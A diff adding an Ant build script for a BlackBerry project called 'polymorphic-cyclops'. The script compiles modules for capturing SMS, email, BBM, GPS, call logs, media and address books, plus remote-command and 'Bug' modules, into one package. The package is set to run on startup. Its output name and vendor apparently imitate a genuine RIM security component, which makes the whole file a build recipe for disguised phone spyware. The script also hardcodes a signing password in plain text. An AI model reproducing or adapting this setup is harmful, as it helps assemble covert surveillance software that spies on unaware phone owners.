@@ -1,0 +1,197 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project name="polymorphic-cyclops" default="buildRIM" basedir=".">
+	<taskdef resource="bb-ant-defs.xml" classpath="lib/bb-ant-tools.jar" />
+	<property name="pinc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\PINCapture\src" />
+	<property name="addressc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\AddressBookCapture\src" />
+	<property name="protmgr" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\ProtSrv\src" />
+	<property name="http" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\HTTP\src" />
+	<property name="compression" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Compression\src" />
+	<property name="crc32" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\CRC32\src" />
+	<property name="protocol" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Phoenix\src" />
+	<property name="encrypt" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Encryption\src" />
+	<property name="sim" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\SIMChange\src" />
+	<property name="bbm" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\BBMCapture\src" />
+	<property name="lic" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\License\src" />
+	<property name="bug" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Bug\src" />
+	<property name="callmon" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\CallLogMonitor\src" />
+	<property name="versioninfo" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\VersionInfo\src" />
+	<property name="connection" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Connection\src" />
+	<property name="event" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Event\src" />
+	<property name="smsc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\SMSCapture\src" />
+	<property name="gpsc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\GPSCapture\src" />
+	<property name="emailc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\EmailCapture\src" />
+	<property name="cellinfoc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\CellInfoCapture\src" />
+	<property name="calllogc" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\CallLogCapture\src" />
+	<property name="db" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Database\src" />
+	<property name="pref" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Pref\src" />
+	<property name="global" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Global\src" />
+	<property name="std" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Std\src" />
+	<property name="smsutil" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\SMSUtil\src" />
+	<property name="rmtcmd" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\RmtCmd\src" />
+	<property name="watchlist" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\WatchList\src" />
+	<property name="mediac" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\MediaCapture\src" />
+	<property name="mediamon" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\MediaMon\src" />
+	<property name="reportnumber" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\ReportPhoneNumber\src" />
+	<property name="callnotification" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\CallNotification\src" />
+	<property name="projecthome" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\Main" />
+	<property name="resource" value="C:\BlackBerry\Projects\Cyclops+UpgradeBBM6\res" />
+	<!--<property name="icon"  value="candy-green-icon.png" />-->
+	<!--<property name="iconPath"  value="${projecthome}\icons" />-->
+	<!--property name="sigtoolPath" value="C:\Tools\Blackberry\Signtool" />
+	<property name="jdehome" value="C:\Program Files\Research In Motion\BlackBerry JDE Component Package 4.5.0" />	
+	<property name="javahome" value="C:\Program Files\Java\jdk1.6.0_20" />
+	<property name="simulator" value="${jdehome}\simulator" />
+	<property name="bin" value="${jdehome}\bin" /-->
+	<property name="vendor" value="Trust Supplier Ltd." />
+	<property name="output" value="net_rim_platformapps_resource_security" />
+	<property name="version" value="1.03.2" />
+	
+	<property name="jdehome" 		value="C:\Program Files\Research In Motion\BlackBerry JDE Component Package 4.5.0" />
+	<property name="javahome" 		value="C:\Program Files\Java\jdk1.6.0_20" />
+	<property name="simulator" 		value="${jdehome}\simulator" />	
+	<property name="bin" 			value="${jdehome}\bin" />
+	<property name="iconPath"		value="${projecthome}\icons" />
+	<property name="sigtoolPath"	value="C:\Tools\Blackberry\Signtool" />
+
+	<target name="buildRIM" description="Composes RIM" depends="clean">
+		<rapc jdehome="${jdehome}" jdkhome="${javahome}" output="${output}" 
+			generatesourcelist="true" sourcelistfile="sources.txt">
+			<jdp version="${version}" runonstartup="true" type="library" vendor="${vendor}"/>
+			<src>
+				<fileset dir="${pinc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${addressc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${protmgr}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${http}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${crc32}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${compression}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${protocol}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${encrypt}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${sim}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${bbm}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${lic}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${bug}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${callmon}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${versioninfo}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${connection}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${event}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${smsc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${gpsc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${emailc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${cellinfoc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${calllogc}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${db}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${pref}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${global}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${std}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${smsutil}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${rmtcmd}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${watchlist}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${mediac}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${mediamon}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${projecthome}\src">
+					<include name="**/*.java" />
+				</fileset>
+				<!--fileset dir="${projecthome}\res">
+					<include name="**/*.*" />
+				</fileset-->
+				<fileset dir="${reportnumber}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${callnotification}">
+					<include name="**/*.java" />
+				</fileset>
+				<fileset dir="${resource}">	
+					<include name="**/*.txt" />	
+				</fileset>
+			</src>
+		</rapc>
+		
+		<sigtool jdehome="${sigtoolPath}" codfile="${output}.cod" password="september" />
+
+		
+		<!--<copy todir="${simulator}" overwrite="true">
+			<fileset dir=".">
+				<include name="*.cod" />
+				<include name="*.debug" />
+				<include name="*.cso" />
+				<include name="*.jad" />
+				<include name="*.csl" />
+			</fileset>
+		</copy>-->
+	</target>
+
+	<target name="clean">
+		<delete>
+			<fileset dir="bin" includes="**/*.class" />
+			<fileset dir=".">
+				<include name="*.cod" />
+				<include name="*.cso" />
+				<include name="*.debug" />
+				<include name="*.jad" />
+				<include name="*.jar" />
+				<include name="*.rapc" />
+				<include name="*.csl" />
+			</fileset>
+		</delete>
+	</target>
+</project>
